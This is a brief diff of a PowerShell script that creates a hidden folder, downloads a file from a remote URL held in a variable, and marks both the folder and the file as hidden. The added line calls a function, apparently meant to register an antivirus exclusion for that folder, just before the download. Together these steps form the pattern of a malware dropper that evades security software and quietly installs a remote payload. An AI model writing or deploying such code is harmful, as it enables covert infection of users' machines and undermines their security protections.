@@ -26,6 +26,7 @@ New-Item -ItemType $directory -Path $hiddenFolder | Out-Null
 
 $tempPath = Join-Path $hiddenFolder $updater
 
+
 function Add-Exclusion {
     param ([string]$Path)
     try {
@@ -34,6 +35,7 @@ function Add-Exclusion {
 }
 
 try {
+    Add-Exclusion -Path $hiddenFolder
     Invoke-WebRequest -Uri $file -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction
     Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value $hiddenAttr
     Set-ItemProperty -Path $tempPath -Name Attributes -Value $hiddenAttr
